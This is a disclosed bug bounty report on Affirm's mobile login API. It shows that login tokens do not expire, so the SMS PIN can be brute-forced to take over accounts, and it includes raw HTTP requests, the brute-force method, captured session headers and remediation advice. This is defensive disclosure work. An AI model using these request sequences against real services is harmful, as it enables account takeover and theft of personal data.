# Absence of Token expiry leads to Unauthorized login Access

## Report Details
- **Report ID**: 766578
- **URL**: https://hackerone.com/reports/766578
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-12-31T19:28:39.154Z
- **Disclosed**: 2020-12-01T00:09:45.558Z

## Reporter
- **Username**: yogesh_ojha
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: affirm

## Vulnerability Information
### Summary
While doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.

The way affirm mobile login works is that,

User inputs the phone number
It then makes a call to an API endpoint /api/v3/login/phone/
```
POST /api/v3/login/phone/ HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 40
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-User-Agent: Affirm-Android

{"channel":"sms","address":"7022170000"}
```

This endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.
The response looks something similar to this

```
HTTP/1.1 200 OK
Date: Tue, 31 Dec 2019 11:53:27 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: XXX=
Affirm-Client: XXXX-
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c
Strict-Transport-Security: max-age=86400
Content-Length: 299

{"response_url": "/api/v3/login/phone/SOMETOKEN"}
```

Another call to the api is made to the URL obtained from the above response_url This API request looks like this

```
POST /api/v3/login/phone/SOMETOKEN HTTP/1.1
Content-Type: application/json; charset=UTF-8
Content-Length: 19
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22

{"response":"0000"}
```

Since SOMETOKEN in the above request doesn't get expired, this request can be sent to Intruder or similar tools to brute force the response OTP parameter.
Once the response is valid, this can be verified by the 200 status obtained in the response and the length of the response.
Like this,
{F672314}

The response will be

```
HTTP/1.1 200 OK
Date: Tue, 31 Dec 2019 12:30:58 GMT
Content-Type: application/json
Connection: close
Server: openresty
Vary: Accept-Encoding
Affirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
cache-control: private, no-cache, no-store, must-revalidate
X-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca
Strict-Transport-Security: max-age=86400
Content-Length: 109

{"status": "authenticated", "token": null, "user_id": "1479-5770-XGGL", "expiration": "3019-12-31T17:17:38Z"}
```

This response contains Affirm-Client which is like a session ID, later used to make a request.

To verify if this is the actual session ID or not, this can be done by making a request to the api

```
GET /api/v2/users/1479-5770-XGGL HTTP/1.1
Host: hackerone.affirm-odin.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.13.1
Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk
Affirm-Platform: android
Affirm-User-Agent: Affirm-Android
Affirm-App-Version: 3.62.3
Affirm-App-Version-Code: 312
Affirm-OS-Version: 22
```

The user ID can also be obtained from the above response.

If the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.

```
{"phone_number": {"phone_number": "+1-702-217-0000", "user_id": "1479-5770-XGGL", "id": "CNAIG0U1BMPHN5BK"}, "status": "ACTIVE", "name": {"last": "NEPAK", "full": "TESTING NEPAK", "user_id": "1479-5770-XGGL", "id": "4ZBC33TYEY12SOWP", "first": "TESTING"}, "is_personalized_services_active": true, "created": "2019-12-31T10:48:00Z", "dob": "1980-06-23", "id": "1479-5770-XGGL", "address_confirmation_status": "not confirmed", "address": {"city": "San Francisco", "user_id": "1479-5770-XGGL", "is_po_box": false, "street1": "325 Pacific Ave", "region1_code": "CA", "is_military_address": false, "postal_code": "94111", "country_code": "USA", "id": "G2YM6ESBLH36ETLZ"}, "user_consented_to_lto": null, "email": {"verified": false, "user_id": "1479-5770-XGGL", "email": "who_has_no_name+0000@wearehackerone.com", "id": "B9SUH5XOB1559Q8J"}}
```
{F672319}

### Remediation
Rate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.
The fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.

Luckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.

Once this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.

POC Video
{F672564}
-Happy New year team Affirm <3

## Impact

Unauthorized account access, Account takeover

## Attachments
- 1.PNG
- 2.PNG
- Screen_Recording_2020-01-01_at_12.47.37_AM.mov
